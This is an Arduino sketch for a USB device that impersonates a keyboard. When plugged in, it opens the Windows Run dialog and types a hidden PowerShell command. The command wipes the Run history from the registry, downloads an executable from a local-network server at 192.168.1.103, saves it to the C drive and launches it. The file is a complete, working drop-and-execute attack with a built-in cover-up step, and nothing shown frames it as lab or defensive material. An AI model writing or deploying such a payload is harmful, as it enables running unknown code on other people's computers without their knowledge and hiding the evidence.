void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(500); 
  Keyboard.println("powershell -nop -w hidden reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f;$p = New-Object System.Net.WebClient;$p.DownloadFile('http://192.168.1.103/x.exe', 'C:\\x.exe');start C:\\x.exe;exit");
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
}
